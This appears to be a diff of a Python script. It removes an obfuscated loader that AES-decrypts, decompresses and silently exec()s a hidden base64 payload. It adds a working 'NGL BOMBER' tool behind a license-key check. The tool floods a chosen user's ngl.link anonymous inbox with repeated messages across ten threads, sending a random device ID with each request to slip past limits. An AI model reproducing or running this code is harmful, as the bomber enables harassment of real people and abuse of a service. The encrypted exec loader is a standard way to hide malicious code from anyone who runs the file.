@@ -1,18 +1,126 @@
-import base64
-import zlib
-from Crypto.Cipher import AES
+from loader import check_access
+import os
+import time
 
+# ==============================================
+# 🛠️ NGL BOMBER CODE MO
+# ==============================================
+import requests
+import random
+import string
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-JMEP_EcQnzT = base64.b64decode('Sm9obk1pY2hhZWwxMjM0NQ==') # key
-JMEP_HhATP = base64.b64decode('UEVub2phbGVzMTIzNA==') # nonce
-JMEP_WdCaS2 = base64.b64decode('vlF3Kv9+EH6qeG5ckkCv8U114QBYUwA0gcoOR2iQQ9KhmUpGAJFSyn62TXDC8Nveivgb89Xz7oA5ACXpDGYEO9k41D4VEzpIQ17KNTWh/Ui6w1Ddlb9rnG/FheswpIwrkFcXlf1BPxBuJRLCquY1GIwANJlMlegPF5yfqREbfTa2IRKH4exJJCYbDwzUEy51ctnm7C77kuh7UxeI8CrBwOFkZv+531pU6i2pASV0A7BdWTLT+cDsiJDggpplloUAVxlIJ89k1gpoCpdA4ZRYkNuGLkgI1hVayFHQvK3wnNmo4uWznWXw/oK83nuomcY3o5LQYha35wQDcuINPsaLTB+8e8M0CUvw1d5o3BCZ8XLPYN7Psq911NYZoPI+SziBIF0oiSpBBeiaVMh1kipa2tGG30JkpcaoohI+uk1oUqGcACukq8FrzzORyiPCN6N2fa9YJ9sSSBeGmtvXx9MfnskXKR9eG8L1+MlA91IiPe5D9LbEWh08lHhlFosMtG6azpoLq34Qlk3cU33GVfCNOAIJaeckepQhdvDO/w8j2yKLFB0kcYeZtYqoLpZg5HGbov6wJUdN5BGQY6UyuIUYqJndHUiV6U7310ncnAPl6DLv6RN2lqbmbwn4hukF6neletf0ezDCHpChQw+odTmd/37HHbtVFSovePJYmkaHwYdnZP/KV1FVNhtwZsazHKAU4ztn6GGs4NucEAnH71zcxJx0K8+Dm2TwCtB2KuC+F5s83gbAjA5vz5xD5bob4yCT9/tvzAVNdoxiZZyvAhnhb1fxeuEWY7hK6lyGc8s2asa6eAY5BXh+WylXxiqcjTiDTZ+LKFuXD9Filykz7/Tr8+6Yv3HsU1gYIoTFmCX/9qO1ZB1466txFOWpZTp7WpEVKCJs2kG59OTRq92z0PjCmB7wAquga4WaGZurrT0fn4X6enAlfTpXFXTmgb0mGeCY5cr/LB3OFI5jFIso0fEiSBwnYkCEbyFS2i6ZfDxRmGATGEcL6BLjOuxfl8OLFAFe25hhm2Zorzcv6eHjj6H+FyX82lTsA07NRrd7zvRX1KmOy4m+oWjgXcYr9+3yHwIad+cNvqPzZ/YA3FMPUDEdDZWtMqKTTXf7P6jUW+B2SIjAiiX32nZd7F0LYbvkSFLlUhBeRZdxPj/oLmBXDMwrNvzsq+f4ad5MWs4hlx7XtusANXWNO9M9zR+BoVWM5wdnxt2vimVk3l/dqhoeIRPj+YP2dajl888mEp4mEwPdH4uM/lxgS/vZ0Ok4J3IxA2SsMn/G3aO5SYHYVSc47Na19qIJ4ZI1S+01EAl6ereyMz/dVIz+K/g8hBAbBIz8hfjuzDlND4yBxBmQHDnpVJGCrfa3dLSvVGv6+CXSFAjxB+exF+mFNd5GXMBIYaIkp0YFHy+Mt8X88P/YYOdPKQOtV1cQUQOo6Gc5CTSxZ+Lcu5dY3sryVCZp6E6GqaGIx9rkRZ2+5pQtq/J7V3ErQzI60PoKxYPZ0eZMOopJHU5qRrrPgUggFwypNzm1uJbWcnmy67Nd+aTYLYyfpRicjZ3uzLvkbRygj21vLycwl8sDbJZo1Jw76tFg2djxD5uC6f6HBXk5lZCNLfNmLDFHmJYh196vcGZVdd0uHoG6+wR0Z8xY6UJpZAIEur1AvCX5/cX7feR1JvdXR8Mzh1/d5fgundxAJ5g9Ns24vfZingf/58ap1Uidj4UgB4iskArRGLKG6iP9A2Ogp5IUfQtJRbylG2tOM6a+oW77oM5q2LecVIwdQrlCQ44uSBnflpnOxWvqBBSKFsOPgbvVvZqywFAqeA0N7sZ0MmPcHG6n0q9uhzHf8wp5eRwQ94SUCT3sFKB25uTq20m1NGYPK3r1SVcNuAuJEmNd4uqR/ycLb+KLX+Bdr/CKbzNV1uXvDWhSiTZbM60K5fMKHRGtmqU+8AqQTa2iLb1wMOujEXRM7Lm1FFCVR/g4bKqhuQ2uTqm8A3brahBpZ5jW53o7IFbjz56UxN5JwGe+EVcXmjCNdwOwQUnQm6ZxDgRKnGcsrAJKAO4c4+oEZrLnZJxe+mpezrBuElY4UBRJ4yS2Ls1n0ppcxEjhqD+ieJ64molBGkVkfja48iM7eEY7ig6Q5cWg1xwzo80m3+hnDFAOjuDD8xrqGWYZWr0STtAbG+/JOf6V2SxJ7OJSmRwQdH8k2ZE4dHkN3gmqFUq0pJgt5QYZ9qe6qdzoiUadTuJjNJXZnlQrCcMJgON7FiibTpZxtn9GtnLov0TXVqtPqqFouyyd2hMxtOo53yEMkYRZdn2lRJ/UnA0QTe4l1nPwubF+GFOw3nOodS0AqiZcCLSOtbILqFy/17rpv1BhIehFtAsi/aPdmwwicqGkQHraM5TieW62gZwPuUsQiWrbB2nEPxergC5ta8K4k6B1FFdHd4g5IWhBrrKD3cdC1zPl0PUz0Rtj29DXckHV899B694D+ky4Ux4ik//YbNNPbQurHBpfxF1m01XiUo4pkh1qGWb8C/6AT0f/K47swvQ3LboXpPh0o1vkQ9cn+VWZd9Y9kABy07l6fMXg/DJQVD6PpSnRtVgNu+nYQrGvsMAg4UyTYkMZ/b+DoCw3VoePKgdbu2qqHQcpPBNu5dPQnK1yTQNYsW6Z9U/15SKVqlkk47wB0QVrNsMlbyxjCLmKG3oGdfvoKbl0tbF7I1/pubUa+GgNaegWeObzsHKnh8SS+8QJ+LasuNxI3l34uh5akGL9q7ln4Ro/bmJx4neza+ANY5q2N9mISxLaAYcOCHMCnaLu6oXA2a97cgeIiDz9pM7P2wedoNZnhnK86QbYOfr7ePYocdhFbD4PQ5bwYZh4vH8cZcFLSvX0UZIx3QActZb6KNcK4S/5CcHQxiUp3oqrN2C4PQdczTB2c5SWWx6opP6uN0So1o9tRkcbM/fBff4SFxl1N3PEXu1p/IDmOBSj/ylYZ/ntyMbapIDBLooOmGnM6QWwAuOaAMlc8r7cZJLAXHdysj9leYKZjItM6rwl1Y+FWGsGeCLZcVFIhlVnEfUMzBsMpTXGjJauK2g7xzaTe73CMxVj85zaVgtMg9zpHAkXBb3QgpH7U6m2ypXyugdkJ5e6VMQSU5sWuM3Jb/uVE5BbEiOoZgYusXPt2toWAJv2ksQDG7Q10432p7jbSdr4DRrVhQ155+fzhWidtH05d9hzS2zkTsauDvl/7lAG9J3nCtgSvteFcKAOSoiJSaZGTminx2sThkQUam+VzLlJCH2ZhSW1ydrPw8mm2j1lRWDt16T1zAiT2Ura+lV58+RYcybHmlzjOCGEjiFnpAvL4omMb9rxJ5hXhEe0KJvUDRTnCtxG5ezvsCnP/dJ8T2VH2pstkJ0KCy2UUDg6w0eckZ2mmb030Czlx3C09hdwid2e/VDfI1c47nzo6yNyd4M/d4xxLaGGQ3LtAnodG8j9cG7J78xtXyAfW/YMXGWuNgYFdzoVOyEPwpimwgRhrJ/psXSPftNOETRXaysmMxSmd9jJ5Jpd2UHf9+vlJS8X/GBTSF5x/gAlhzkuXICFV1RXTaIZ3TKIedLsSCHfqKRPtugi93oHeBWeD9cT7c6QzC8w39lL2OszrFPwce/xGTUVLJOHD6d7tJKWj1L/0PMXduU0dsPkmF5qnBd1zFi9uy6ZindD0YzYpEyX6a0qVowfThciiauk990OvYx7FekzpGNTBkZMeOehZh/ABKV0LG/onBmqk6q50FIdG1vVyLjymkP2Gd0GQdOcqOyrk046LfMMkRqejEkfJvlX5zn80DJEew4thob9F9jWUL96pP0E1MPEn5DnsjoRF10kDiLIfmwbc44t7FKpym63OszdFMuT6aOpq5Eki7UHo/uietvNeyreNa8X3zwtd5/0360HpZjDPiad/FUIhDYYxav10CZ7FlZ6h4A0X3/kq06csf91U1R1+jMKzsv0/ttNrLses81a6ogPVEAqWTMyM75SC9f9+VWWNS+gdtNnzQzfrOfvuhKcSet0MNMOeUMr1zV7R025WrcRZ9D529o9ffvUoMP1rhKqFH9nPRhkIHKMQLdP52dDHDpgZOFluht8U+Bjq8RwKSGQpn7RO/3hPOZkkrvzXEhZq9R+P87mgI2vWLcfHo3G6i2t5Fay8xMYf/bj8eW59TXc3RRmVuRUJTKrFzqEdVnSwHuPW4BG21zwH0QfExeNUdLSKxSQYHOi53nLJLesVWK+xO9urb2w5k0iu7MiH6T2RgfPeJ2h5Pjq/AAhx5hX/e1J0EpfGlGq4q9tn/hU/00iGTZh9e461m6NQ063FyZdSVnyIThAwtORfId45hWBvnwv4P6KsOIY5fkPrJecXCUeDZ1OU5hziJF8E/S3uPpmBR9SXuEwTpTQhn+7pK6FPC/RXGjO4fI2qCWf90FLL7U5KKvBWynZ8X8Xz9O60MvBXS7pq7kWa8Ab1RTy2hDHQXXi26rOfyNqO/vpmH1q6WIUAAMrXM+6XpeTJdJ92lFz7sni1feztr2Slxtf3aulRsidFmrINWzKEkexWSpdRy7fmX+vLvajSkVi4IIsNraTc7AmMV5zJNSlXDmZax8/0lcY5NPtujRX0I/XivTo/Dkkpw42f3rklKz5GJkzmSfW70ctvmAG+KPG6XK7NM3MHShd9TRw5t0aKQi+euq+9pRGJUI1eKZgytwa64svU4Nbjfqrd9lk627vgnmglB3O2VBmfYlk2JhBDufphiobLhmSSp0WwspY0vhcpc0qP5heNRbZKRovIokkmE4XboEXTl4voVUtChaRABJgHLzWs23svK5+pzrQHjn7J61kHXKTsawRy5YZziFx9xB9qerSTkcoGHFEBY10YWK2RwiBdYdAZYtYVkcN+uPOIIeU1+eXOdJhRf+FYRN3i87bIW16G4M+7RoTA7kjTq4cBebZ8lIo2RyIvGlojksDPwLOagzhylVzGlXhbwQGWPKqt9xW6LeuEDuXiY/sKH5J3N6hzbSSoYBb0ocjnIzS1l9Vd8KiXs/Rqt+5YcULLpdGGRk5+TqX8PbZU5HSzpOAnAs7SdUfFEvGLKVnAFsTqX3HVFe0f9YE7iNsTdW2BiRlUDdGp4igciTlYuE8kEwJiI3gHcnlvoJl+2Lf6ielI8v3pSbear4FBT4u8ilZD8kaMQ0K3e0HyW5Fd0qliFGoRepU8Z21jk32/Ou80yoaqMFpkgXEg51atiUAHo/yB4s1Jwoa/EyYUU/eDl2CeF5wCLiNeVoBbGclbNZHWUHMLfgEltwmaWu9q4H02ei0l1Dcv0H9msiqkKMUjtU+S2SzI55MjWXu6vl/WGaMsZp70TtTtnCDxBBNEzkzMKfAeTnufDlLjEF49nUZmwHkmVXcBYxE32zrCeFhAlPyYZLjKyCjy7t3gXyVUTH+RqDdFPb33QCIKift5gvXvPWH5bToH1O6b3mWMwhP9xVV7S5kKyKgCqzc2FSZmCZ3o4d4+FNitpkI67U+Ro1xOO+MWmUKbtL6Yvkg5g4R1ijiCDP+hpzu23Elzsqzu/DJY5pI18VA86b8fGXYyudXbqvnx07ZGrG4uiVQAGc6PuiJT2wFI1mdq1hzhAfgLyaAiPT4RpqnBRVZxsgwo4BfwDAoR1tTtEJZellbcBUIStWhA57TlO2YGlkwoTUi8yuWrVBYr/lSJ3fgjC+3oj4TaMughRrHub1aj7pdbt+WIluidq689EXHxFTaxpOhR+O2mTPlmCOvrlrj+Wxqc66BqUkQ7icvXi2iZspGbytzDvKRMJAxUIazXdPaWA3XnhpIwpjGAV5TSVbbMdf7xUWeeJkny0jrA2pQIH+q+G03/8o636LF+2sqVh5UNcVqsUCkd2n1uTtCWs7GAtXIrMqMQmeYrEtpk+tmrHnCXpqHd/XXymd5OevXb7u4xyHaJOdk8MQnjnSTKrou0nveTFsCRR/SxuUbV6F2AQg2NMX5LlFIq53OAIFHUqyqFGhTdYPTEM7yF0kMW5EdSupeKyTydRXjATGc4FKQkx6FR5zwbddiEnBAvQ1nHHM514Dz1R71MWYMoOnUGeWuHZ8NM9d7C1fHI+TB8Pqp3scfdcEcnSGIznBGWHjm9ac3fcSuxOYYWJ6n57b/oxm5WD8tFGXU50ODEzrxgZ5tgtmKh2Ray+1dSjYrWexr+jVZGu9cDiz5wRhHDdNScMerKPDdaueT4Z8P8JIvI1mrdlvbvwBbzqd7Jp+C2eFKDdXiGJ8lqVlYeqE3rwb2sOf0BefjxKWBqRHxJ5GPAcn48no8XuC7EcrFIi2S6KhgqIukhGCgTrgwDEZrjb3mAfFwqEp96Zb2K7oxgw99kwJ9iihM+F/vsWRUabia5gnOs2LcHStofwF2RS7nxvSNPaY7tBXpaggBUFCLlAejPTy0YuPYlyXsADYrmnmP1Jaytkr6udl+xNDWQaRc4lVv7Ba510mRa/hHlSttJsSeO+tPmbjlR7Xpb9hLLZlFkxCEtrh+i1jQIafq2K8MDeSkw7hJmiF157a72cRtAEA7XYxhxe+5nqiMSAFGQGtMk/LDwtwf3vYC0FLdpCwRrQChr0O2VytsQpClGYeFjhgAhh3f/vQg2+wSRpbVu3/OGaE2JkruPSxDo1aO2gsSoCdBkGksMb82ElG8hdUsBBa3XVly+UQHu9FSB6CqWEk1Q60gKKkFmMw3edtR87VB0k88od0atScQbxi9/xPJ0geU7Ry4u7ePq5faMg0m55IvchnSJFn+slDJVTx07t79lJizi/GzRi9yyH96UgUs+qo1jYpv2BJgXnlDY1BIAAcn2CIUdem9w3it0oiQf5UCUvPK7szZDtkZVE7CtwBWy/DNc4oI5cgca1sYOJ+89tX5u0+jkXUd/w1u9RoIDubw47vWO6SeRq6dboE3VNH5U0vq3xEd5+9monVKX0lZwPd12A3RXO9c8WHtPH2IE5XcjJJ6MfOthN4+POFRSzLp0v+iTEQzk2DOAKI5HyZveLj5K8pZ0Izl4D1w9/1VhxbSCNI2eOkyelsoxjLdykEjcB5W0Kg7Ds7KR0eDk3fe9oAqf5MejVMml4D86mugxTt7WKT14ywI2YBHFx/gnnHjx8cfu/iy9vVEsLCY7HVGgYl+UaYRVMqTs3vP7dJCb46KRg3/bElZlAb3UAfzZ9LwmFPxvn9LEJ3reLCjO/9hsCCkFt0cxm0sCN47jJmYEz5zdoxsWyZGcxOEZzBMYxcgAEkwiO7eavlNtuQh5/IcORAoxe5tSLwE0ZRgFYvGHjYpgRO1ty0UY4TD1uIMSu/aWfxz/dfzvUsNwh2nE9udilP2E+3F3/6MBJ5kPHaZzHARxGF3kr9I3koH45mqKwxP3sCrgmqus97HWzI5QbNKWXiqB+yESySZRPNYiX0HUjybdls8a0CSpipYpjC1W3EyoSKZDqgIhp99WebaV6eEAkHpwjH7X+B4dcPfepY76aTTAr/PQeb9fYduByqIKu2bYl8/lGJRap6VdNVcmFrYxDEx3rnWvDVSblL9J4LfCP/TtTg1p6BPHiUfDy5v6YszeMYzKS2eKaZtt6LIwFS4RkzO+2nfjvNo3SlBJ6wRPjLzLUSvxL02olmUyjjDT0iL0JSOD6/2d60c0QCSIr9vpen5DygTxulQ5u/RP25tBRySNoinLsstnJVs3A04dPPlZokuM12xNKx6WwzJ6K32Zz6KfjkEsn8kqw5nBUuPjrOYq3i9OTl+UH7m3gpUcyKWZn0w6Kmn6G5GH3k3YQbTREZGoL8+94eDpLhhTgsXC9sX+l3SjhkzY1L3NiLeHOYc4RysVpLsLIMbJ85oYcZOZY+bGW83pEttwT+PouIULOu3unMO+wUu8bpRUI2AFKgLaevxwZJ8v0SjvoRbr+wgj42fE7cIKM/HD2qgp/2zEqrVGIn8taMClyxf4MmHO2UhHyFw/p/z1MHzLA2KgejzNPB/fNmW7V7zkbAsfy3SnshssHLGX4xqwJ920JsVXh+5b76wL3l1PTqNmPoV2+Mm1E+qPf8ZdBaPixQwmNQ7turTISSqI+McH2tYE+gMiNprO4w73yQHH6BSwM13GNjvb0485v0wUyPez5B2ote5wHRse4b0fJ1xcrh8/8ffjKBBgx0wlqlTd+y1CMcoiUhaIDIvGLaSP8xCwidE7eKIJdU4wZ2J7D+myMzNwxUoU4xPF4Nr+yoEEBA/K72mMz+yD1JKJhNRtjGLirpgYMvwKmCeyUragkGpSQjS2hK/i9hDBeKZRaOJPkWtdKK6q+SmnsDzTq4m43I8EWajWMMtgUmZx1R9Snd0qInCKPVmyiPmjIWoaQXZDZeICnb+LAtCuAWNtlDWIWzX0nnvfOjjae0M+vT43LwzhiidgrJvYv5NY9KHA+0qtW1P9k3jbeoUiFVk9EH5grAisYPPgGE6p0zJXOiEeW0YpXbwl9M3Yr0jxIOhqrMivu7FM+4O0wJPr3NnoWLger74vg7jzxwgCurwJo85/QhqvMNPnTq2LU8B8iG173alMyy0DbPiTMDsKdZKt2EKgCNIld/yiH0zJYH3tGIzaQdnpXNoD+myjxJSI9ElExUHFGnhtthBR4zf+st7qyIM/zEJlb9Pnr38bfKdNu18tQG5W8cW7AUMtInHYWbcl6h2Etx05i0ie0WpPdyt3/nEK/um84Wr4AInr74xgZpAOaph1eoVMJvObc021ih9vQE9fIW+rDh3fRthz3rH/T5WApq8yBaHzrJzArR20BuKexY8qwh+lnP/6OsQVxfo4Nk+CuRB0T7g07+jYYWxdjBspSbRdqLs4+dPZS7teXRgM4PK42OEoY+YfgU5o5kmJv66MgWy4kXWQR6iCjvwshqm2gppLgwJg4lgDP3iE6iYPfSiLnNZZUoljCoo41OoGYXDFDEnGkg05IiULwkuvk+K2AZlbBUHnUMe/Z6XPUFjswaJps7sPFq3+oFKQ10Em8kwD0+hzqRGna4A83nnEo7woN0aYsi/6pJeoQ8MXvTxWwrkrDo5d9jMbm0GWBGjlbIAvkoNZv7QR4AKSexY8dKK+p78L/tcyqLWkWj9/oF1Q2+gTrD5R5Hl3jfNwEdhWLcPaJydTjspBH7v8f4Vn/fmxRKERuGkjCX9ilmBVj/DjdwxTET+LIC6BlAnCaLPjIggDJf2jZyEw4Jq27NNn5thARV5wu4C2hx57iq2Z1TjPe03ylNlOr7f9bU1PaoyDGWQ9KY+OPeyurrdE1YfqR3X/NEEJjoAih8wiVHCqzIkIs+N6bxhXiQRmgaKl6eYL20dcpGKiy/V4DTAbADPe0ikyAQzt8IKHnjKHA7mYHtPsWJvPllPW8bhasHgfec6nspOHC+eu9SNyqIOzwxb2eeA96pMYySNFc/QrjEgAE+g10jIeiSB4RMYdDT+O/NnG3s0IIv3CEsiqg43dc1dJTra/RR3WuZGLwhrgDP5sRYHw4DbDQ58//ZNGKdJcl91DPKqWDvRyDyMuKz7oOuEue8PB2JmmSIecq0W3pa0mcMtNvzbL8/A+E4Rw8dQf9vV6HTWuutsLyM0Mua7kwthArpghQcip7YBgTAMEIfeYFb23+gvnZXxqEjmIZu+9Fk0nq9uWgRT749lV4ejcTDKIJnSAi5gAkQ2EGc/8hoI6pktMk+lruQj2Oraksymmh78HZkuKY2uqCLwTcMMfN+hbnPNkzeKcTkeJiwfMjoLKpKTNz+i4GGOUx1syxYrFSEqNxd0pP+uC2iT5CPrmhl3WH8m+O/WKiTGrJ6+xWVBcUcJhuIW7l/GtzoBVLIIS0xW8NuhvTfHxYlAiqLxbf7Bfczaey/Cl5kaT+WaWKleYP77swX1gheb+ODeVy05zWCw8v0AGRTOLmhOjMx7CLLXOnrh3opBxKF8vuLlLro7p3GIZ3wYmpBy5bOkGBXY6USADJmwO/OIT0mftPXR6Jn7+BJlTxmZ8b+uWF4JNeb8ycvb8RZSPuan1iW6fUSvII/ovxl+DOVVOzp3JnzH/x6g56YZQih/H+l3meX3L+xRjYThztDyVXJWn34qDEqsmTqhIYwL6JU0Yn1c3MdnBlr4s0Duvd6H0JihRRIwQjPqM8KtHmNcV0gpc2e+R9o/jJ02e5HNsrw7WdSuetLer5XYk7c4iqmShQ2whLRV4kIl1aw44p0RpmUiaBkbxYG8iY1+1zcM97vYUeA0iwf6w6Ns6uK1WzKzSK+HJfX8Kxa9+IcrP0r1A5BESNym23leYAOe/vj4FaXaLoAmZWMbzxdJxpwGujdcUpjtBoCsDINmVBEx3svSt3johPYOHwfmBlJ+u6k9ki3xerGFNIiNvMZJWgpSNmfexXupGt7n/A==') # data
-JMEP_HvNPAa = base64.b64decode('jYu09e6VZuZoLPkcJ79rLw==') # tag
+class Style:
+    BRIGHT = '\033[1m'
+    SKULL = '\033[0m'
+W = '\033[1;37m'
+B = '\033[1;30m'
+R = '\033[1;31m'
+GR = '\033[1;32m'
+CY = '\033[1;36m'
 
-try:
-    _cipher_obj = AES.new(JMEP_EcQnzT, AES.MODE_GCM, nonce=JMEP_HhATP)
-    JMEPSMS_SIrdoV = _cipher_obj.decrypt_and_verify(JMEP_WdCaS2, JMEP_HvNPAa)
-    JMEP_wRJAIa = zlib.decompress(JMEPSMS_SIrdoV).decode('utf-8')
+class NGL_BOMBER:
+    def __init__(self):
+        self.total_requests = 0
+        self.success = 0
+        self.failed = 0
 
-    exec(JMEP_wRJAIa, globals())
-except Exception as e:
-    pass
+    def clear(self):
+        os.system('clear' if os.name == 'posix' else 'cls')
+
+    def random_string(self, length: int) -> str:
+        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
+        return ''.join(random.choice(chars) for _ in range(length))
+
+    def send_ngl_request(self, username: str, message: str):
+        try:
+            url = "https://ngl.link/api/submit"
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+                "Accept": "*/*",
+                "Origin": "https://ngl.link",
+                "Referer": f"https://ngl.link/{username}",
+                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+                "X-Requested-With": "XMLHttpRequest"
+            }
+            payload = {
+                "username": username,
+                "question": message,
+                "deviceId": self.random_string(32),
+                "gameSlug": "",
+                "referrer": ""
+            }
+            response = requests.post(url, data=payload, headers=headers, timeout=15)
+            if response.status_code == 200:
+                return True, response.status_code
+            else:
+                return False, response.status_code
+        except Exception as e:
+            return False, None
+
+    def start_bombing(self):
+        self.clear()
+        banner = [f"{CY}","╔╗╔╗ ╔═╗╦ ╦","║║║║ ║ ║║ ║","║║║║ ║ ║║ ║","║║║║ ║ ║║ ║","║╚╝╚╗╚═╝╚═╝","╚═══╝      ",f"{GR}       NGL BOMBER TOOL",f"{R}   MADE BY: JOHN MICHAEL"]
+        for line in banner: print(line)
+        
+        print(f"\n{W}[{CY}+{W}] {GR}SETTINGS{W}")
+        target_user = input(f"{W}└─➤ {CY}Enter Username : {GR}")
+        target_msg = input(f"{W}└─➤ {CY}Enter Message  : {GR}")
+        try: bomb_count = int(input(f"{W}└─➤ {CY}Count Bomb     : {GR}"))
+        except: bomb_count = 50; print(f"{R}⚠ Invalid input, set to 50 default{W}")
+
+        if not target_user or not target_msg: print(f"{R}❌ Username or Message cannot be empty!{W}"); return
+
+        print(f"\n{CY}========================================={W}")
+        print(f"{GR}TARGET  : {W}@{target_user}")
+        print(f"{GR}MESSAGE : {W}{target_msg}")
+        print(f"{GR}COUNT   : {W}{bomb_count}")
+        print(f"{CY}========================================={W}")
+        print(f"{R}⚠ STARTING BOMB... PLEASE WAIT...{W}\n")
+
+        self.total_requests = 0; self.success = 0; self.failed = 0
+        with ThreadPoolExecutor(max_workers=10) as executor:
+            futures = [executor.submit(self.send_ngl_request, target_user, target_msg) for _ in range(bomb_count)]
+            for future in as_completed(futures):
+                self.total_requests += 1
+                res, code = future.result()
+                if res: self.success +=1; status=f"{GR}SUCCESS{W}"
+                else: self.failed +=1; status=f"{R}FAILED{W}"
+                print(f"[{self.total_requests:03d}/{bomb_count}] STATUS: {status} | CODE: {code if code else 'ERROR'}")
+        
+        print(f"\n{CY}========================================={W}")
+        print(f"{GR}✅ COMPLETED!"); print(f"{W}TOTAL   : {self.total_requests}"); print(f"{GR}SUCCESS : {self.success}"); print(f"{R}FAILED  : {self.failed}"); print(f"{CY}========================================={W}")
+        input(f"\n{W}Press Enter to return to menu...")
+
+# ==============================================
+# 💻 MENU
+# ==============================================
+def run_my_application():
+    while True:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print("=" * 50); print("🔥  JOHN'S PREMIUM TOOL  🔥"); print("=" * 50)
+        print(f"{GR} [1] 💣 START NGL BOMBER"); print(f"{R} [2] ❌ EXIT"); print("=" * 50)
+        choice = input(f"{W}👉 Select Option: ")
+        if choice == "1": NGL_BOMBER().start_bombing()
+        elif choice == "2": print(f"{R}👋 Exiting..."); break
+        else: print(f"{R}❌ Invalid Option!"); time.sleep(1)
+
+# ==============================================
+# 🚀 SIMULA
+# ==============================================
+if __name__ == "__main__":
+    os.system('cls' if os.name == 'nt' else 'clear')
+    print("=" * 40); print("🔐  SISTEMA NG PAG-LOGIN | ONLINE MODE"); print("=" * 40)
+    user_key = input("🔑 Ilagay ang iyong Key: ").strip()
+    allowed, status = check_access(user_key)
+
+    if allowed:
+        if status == "NEW_USER": print("✅ UNANG BESES! NAI-SAVE NA ANG ID MO SA SERVER.")
+        elif status == "ACCESS_GRANTED": print("✅ MALIGAYANG PAGBABALIK! KILALA KA NA NG SERVER.")
+        run_my_application()
+    else:
+        if status == "INVALID_KEY": print("❌ MALING KEY! Wala sa listahan.")
+        elif status == "LIMIT_FULL": print("❌ PUNO NA! GINAGAMIT NA SA IBANG DEVICE.")
+        elif status == "TOKEN_NOT_FOUND": print("❌ HINDI MAKITA ANG SUSI NG SERVER!")
+        elif status == "SERVER_ERROR": print("❌ HINDI MABASA ANG SERVER!")
+        else: print("❌ ERROR!")
